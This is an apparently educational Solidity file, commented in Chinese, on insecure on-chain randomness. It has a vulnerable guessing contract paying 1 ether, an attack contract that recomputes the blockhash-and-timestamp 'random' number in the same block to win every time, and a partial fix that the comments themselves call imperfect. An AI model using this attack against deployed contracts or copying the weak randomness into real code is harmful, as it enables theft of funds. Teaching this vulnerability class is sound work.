// 失败的随机


// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract GuessTheRandomNumber {
    constructor() payable {}

    // abi.encodePacked 对参数进行编码，solidity 提供两种编码方法 encode 和  encodePacked，
    // 前者对每一个参数进行 32 字节补齐，后者不进行补齐而是直接将待编码参数连接起来。
    //
    // keccak256 哈希算法，可以将任意长度的输入压缩成 64 位的 16 进制的数，且哈希碰撞的概率近乎为 0。
    //
    function guess(uint _guess) public {
        uint answer = uint(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        );

        if (_guess == answer) {
            (bool sent, ) = msg.sender.call{value: 1 ether}("");
            require(sent, "Failed to send Ether");
        }
    }
}


// 攻击合约
// 分析攻击流程：
//1.Alice 使用一个以太币部署 GuessTheRandomNumber 合约；
//2.Eve 部署 GuessTheRandomNumberAttack 合约调用 attack() 函数并传入 GuessTheRandomNumber 合约的地址；
//3.Eve 赢得一个以太币。
//
// 首先，GuessTheRandomNumberAttack.attack() 模拟了 GuessTheRandomNumber 合约中随机数的生成方式生成随机数后
// 调用 guessTheRandomNumber.guess() 并将生成的随机数传入，
// 由于从 GuessTheRandomNumberAttack.attack() 生成随机数到调用 guessTheRandomNumber.guess() 都是在同一区块中完成的，
// 且在同一区块中 block.number 和 block.timestamp 这两个参数是不变的，
// 所以，GuessTheRandomNumberAttack.attack() 和 guessTheRandomNumber.guess() 这两个函数生成的随机数的结果是相同的，
// 从而攻击者可以顺利通过 if(_guess == answer) 判断得到奖励。
contract GuessTheRandomNumberAttack {
    receive() external payable {}

    function attack(GuessTheRandomNumber guessTheRandomNumber) public {
        uint answer = uint(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        );

        guessTheRandomNumber.guess(answer);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}



// 优化： 使用未来区块哈希来生成随机数也就是将猜数和领奖分开做异步处理。
// 添加了 deadline 参数将 guess 和 claim 做了异步处理，在部署合约后的 72 小时内可以调用 guess()
// 猜随机数，在 72 小时后 guess() 关闭 claim() 开启，玩家可以通过 claim() 来验证自己是否猜中。
// 这个修复合约并不是完美的解决方案，正如前置知识中提到的，如果矿工来玩的话他可以在打包的时候知道自己是否猜中，
// 如果猜中打包上链，如果没有猜中放弃打包（相信没有任何一个矿工愿意为了得到一个以太而付出这么大的代价）。

contract GuessTheRandomNumberCorrectWay {
    constructor() payable {}
    uint256 public deadline = block.timestamp + 72 hours;
    mapping (address => uint256) public Answer;

    modifier isTime(){
        require (block.timestamp > deadline, "Not the time");
        _;
    }

    event Guess(address, uint256);
    event Claim(address);

    function guess(uint256 _guess) public {
        require(block.timestamp<=deadline, "Too late!");
        Answer[msg.sender] = _guess;
        emit Guess(msg.sender, _guess);
    }

    function claim() public isTime{
        uint256 key = uint256(keccak256(abi.encodePacked(blockhash(block.number-1),block.timestamp)));
        uint256 answer = Answer[msg.sender];
        require(key == answer, "sorry, maybe next time");
        payable(msg.sender).transfer(1 ether);
        emit Claim(msg.sender);
    }
}

// 参考： https://mp.weixin.qq.com/s/2_2GsyZ54Vs8Trcbg4766g







